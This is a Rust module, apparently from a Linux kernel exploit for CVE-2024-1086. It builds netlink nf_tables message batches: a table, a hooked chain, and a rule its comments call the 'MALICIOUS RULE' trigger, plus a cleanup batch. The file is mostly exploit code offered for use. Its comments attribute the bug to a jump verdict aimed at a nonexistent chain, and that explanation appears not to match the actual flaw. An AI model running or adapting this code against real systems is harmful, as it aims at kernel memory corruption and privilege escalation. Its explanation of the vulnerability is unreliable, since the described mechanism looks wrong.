//! nf_tables specific message construction for CVE-2024-1086

use super::netlink::*;

// Subsystem
pub const NFNL_SUBSYS_NFTABLES: u8 = 10;

// Message types
pub const NFT_MSG_NEWTABLE: u8 = 0;
pub const NFT_MSG_DELTABLE: u8 = 2;
pub const NFT_MSG_NEWCHAIN: u8 = 3;
pub const NFT_MSG_NEWRULE: u8 = 6;

// Batch markers (absolute, not subsystem-qualified)
pub const NFNL_MSG_BATCH_BEGIN: u16 = 0x10;
pub const NFNL_MSG_BATCH_END: u16 = 0x11;

// Table attrs
pub const NFTA_TABLE_NAME: u16 = 1;

// Chain attrs
pub const NFTA_CHAIN_TABLE: u16 = 1;
pub const NFTA_CHAIN_NAME: u16 = 3;
pub const NFTA_CHAIN_HOOK: u16 = 4;
pub const NFTA_CHAIN_POLICY: u16 = 5;
pub const NFTA_CHAIN_TYPE: u16 = 7;

// Hook attrs
pub const NFTA_HOOK_HOOKNUM: u16 = 1;
pub const NFTA_HOOK_PRIORITY: u16 = 2;

// Rule attrs
pub const NFTA_RULE_TABLE: u16 = 1;
pub const NFTA_RULE_CHAIN: u16 = 2;
pub const NFTA_RULE_EXPRESSIONS: u16 = 4;

// Expression attrs
pub const NFTA_LIST_ELEM: u16 = 1;
pub const NFTA_EXPR_NAME: u16 = 1;
pub const NFTA_EXPR_DATA: u16 = 2;

// Immediate attrs
pub const NFTA_IMMEDIATE_DREG: u16 = 1;
pub const NFTA_IMMEDIATE_DATA: u16 = 2;

// Data attrs
pub const NFTA_DATA_VERDICT: u16 = 2;

// Verdict attrs
pub const NFTA_VERDICT_CODE: u16 = 1;
pub const NFTA_VERDICT_CHAIN: u16 = 2;

// Verdict codes
pub const NF_DROP: i32 = 0;
pub const NF_ACCEPT: i32 = 1;
pub const NFT_JUMP: i32 = -3;
pub const NFT_GOTO: i32 = -4;

// Hooks
pub const NF_INET_LOCAL_IN: u32 = 1;

// Registers
pub const NFT_REG_VERDICT: u32 = 0;

fn nft_type(msg: u8) -> u16 {
    ((NFNL_SUBSYS_NFTABLES as u16) << 8) | (msg as u16)
}

pub struct ExploitBatch {
    table: String,
    chain: String,
}

impl ExploitBatch {
    pub fn new(_sock: &NetlinkSocket) -> Result<Self, String> {
        Ok(Self {
            table: "x_tbl".into(),
            chain: "x_chn".into(),
        })
    }

    /// The CVE trigger: verdict with NFT_JUMP/GOTO but invalid chain reference
    /// causes nft_verdict_init to fail after already incrementing refcount
    pub fn build_trigger_batch(&self, sock: &mut NetlinkSocket) -> Vec<u8> {
        let mut b = MessageBuilder::new();
        let pid = sock.pid();

        // BATCH BEGIN
        b.begin_message(NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST, sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_UNSPEC as u8);
        b.add_attr_u32(1, 0); // NFNL_BATCH_GENID
        b.end_message();

        // NEW TABLE
        b.begin_message(nft_type(NFT_MSG_NEWTABLE), NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK, 
            sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_INET as u8);
        b.add_attr_string(NFTA_TABLE_NAME, &self.table);
        b.end_message();

        // NEW CHAIN (base chain with hook)
        b.begin_message(nft_type(NFT_MSG_NEWCHAIN), NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK,
            sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_INET as u8);
        b.add_attr_string(NFTA_CHAIN_TABLE, &self.table);
        b.add_attr_string(NFTA_CHAIN_NAME, &self.chain);
        b.add_attr_string(NFTA_CHAIN_TYPE, "filter");
        
        let hook = b.begin_nested(NFTA_CHAIN_HOOK);
        b.add_attr_u32(NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_IN);
        b.add_attr_u32(NFTA_HOOK_PRIORITY, 0);
        b.end_nested(hook);
        
        b.add_attr_u32(NFTA_CHAIN_POLICY, NF_ACCEPT as u32);
        b.end_message();

        // MALICIOUS RULE - The CVE trigger
        // Using NFT_JUMP with a string chain name that doesn't exist
        // This causes nft_verdict_init to fail, but the verdict data
        // has already been partially processed, leading to UAF
        b.begin_message(nft_type(NFT_MSG_NEWRULE), NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK,
            sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_INET as u8);
        b.add_attr_string(NFTA_RULE_TABLE, &self.table);
        b.add_attr_string(NFTA_RULE_CHAIN, &self.chain);

        let exprs = b.begin_nested(NFTA_RULE_EXPRESSIONS);
        let elem = b.begin_nested(NFTA_LIST_ELEM);
        
        b.add_attr_string(NFTA_EXPR_NAME, "immediate");
        
        let data = b.begin_nested(NFTA_EXPR_DATA);
        b.add_attr_u32(NFTA_IMMEDIATE_DREG, NFT_REG_VERDICT);
        
        let imm_data = b.begin_nested(NFTA_IMMEDIATE_DATA);
        let verdict = b.begin_nested(NFTA_DATA_VERDICT);
        
        // KEY: NFT_JUMP (-3) with non-existent chain triggers the bug
        b.add_attr_u32(NFTA_VERDICT_CODE, NFT_JUMP as u32);
        b.add_attr_string(NFTA_VERDICT_CHAIN, "NONEXISTENT_CHAIN_12345");
        
        b.end_nested(verdict);
        b.end_nested(imm_data);
        b.end_nested(data);
        b.end_nested(elem);
        b.end_nested(exprs);
        b.end_message();

        // BATCH END
        b.begin_message(NFNL_MSG_BATCH_END, NLM_F_REQUEST, sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_UNSPEC as u8);
        b.end_message();

        b.finish()
    }

    pub fn build_cleanup_batch(&self, sock: &mut NetlinkSocket) -> Vec<u8> {
        let mut b = MessageBuilder::new();
        let pid = sock.pid();

        b.begin_message(NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST, sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_UNSPEC as u8);
        b.add_attr_u32(1, 0);
        b.end_message();

        b.begin_message(nft_type(NFT_MSG_DELTABLE), NLM_F_REQUEST | NLM_F_ACK, sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_INET as u8);
        b.add_attr_string(NFTA_TABLE_NAME, &self.table);
        b.end_message();

        b.begin_message(NFNL_MSG_BATCH_END, NLM_F_REQUEST, sock.next_seq(), pid);
        b.add_nfgen_header(libc::AF_UNSPEC as u8);
        b.end_message();

        b.finish()
    }
}
